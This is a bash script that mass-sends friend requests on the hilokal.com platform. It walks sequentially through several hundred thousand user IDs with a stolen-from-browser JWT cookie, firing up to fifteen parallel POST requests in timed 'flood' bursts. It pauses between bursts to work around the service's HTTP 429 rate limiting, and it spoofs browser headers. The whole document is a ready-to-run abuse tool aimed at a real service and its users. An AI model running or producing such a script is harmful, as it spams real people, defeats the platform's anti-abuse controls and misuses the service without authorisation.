#!/bin/bash
# Full-throttle parallel flood for 15s, pause 15s, resume from last userId.
# Get your JWT from hilokal.com browser cookies (Application → Cookies → jwt)

JWT="YOUR_JWT_HERE"

START=673783
END=999999
SEND_SECS=15
PAUSE_SECS=15
MAX_JOBS=15      # max parallel requests at once
DELAY=0.1        # seconds between launching each request
URL="https://elb.hilokal.com/user-relationships/add-friend"

trap 'echo; echo "Stopped at userId $uid — set START=$uid to resume."; kill $(jobs -p) 2>/dev/null; exit 0' INT TERM

send_one() {
    local uid=$1
    local out status resp
    out=$(curl -s -w "\n%{http_code}" \
        -X POST "$URL" \
        -H "Content-Type: application/json" \
        -H "Accept: application/json" \
        -H "Origin: https://www.hilokal.com" \
        -H "Referer: https://www.hilokal.com/" \
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36" \
        -b "jwt=$JWT" \
        -d "{\"userId\":$uid}")
    status=$(echo "$out" | tail -1)
    resp=$(echo "$out" | head -1)
    if [ "$status" = "429" ]; then
        echo "  [#$uid] HTTP 429 RATE LIMITED — skipped"
    else
        echo "  [#$uid] HTTP $status  $resp"
    fi
}

total=$(( END - START + 1 ))
echo "========================================"
echo "  Hilokal Intruder — Full Throttle"
echo "  Range  : $START → $END ($total payloads)"
echo "  Timing : ${SEND_SECS}s FLOOD / ${PAUSE_SECS}s PAUSE"
echo "========================================"
echo

round=1
uid=$START

while [ "$uid" -le "$END" ]; do

    echo "[$(date +%T)] ── Round $round: FLOODING for ${SEND_SECS}s ──"
    burst_start=$(date +%s)

    # Launch requests in parallel, capped at MAX_JOBS, until 15s is up
    while [ "$uid" -le "$END" ] && [ $(( $(date +%s) - burst_start )) -lt "$SEND_SECS" ]; do
        # Wait if already at max concurrency
        while [ "$(jobs -r | wc -l)" -ge "$MAX_JOBS" ]; do
            sleep 0.05
        done
        send_one "$uid" &
        uid=$(( uid + 1 ))
        sleep "$DELAY"
    done

    # Wait for all in-flight requests to finish
    wait
    echo "[$(date +%T)] Burst done — reached userId $uid"

    if [ "$uid" -le "$END" ]; then
        echo "[$(date +%T)] PAUSING ${PAUSE_SECS}s..."
        sleep "$PAUSE_SECS"
        round=$(( round + 1 ))
    fi

done

echo "[$(date +%T)] Done — all payloads sent."
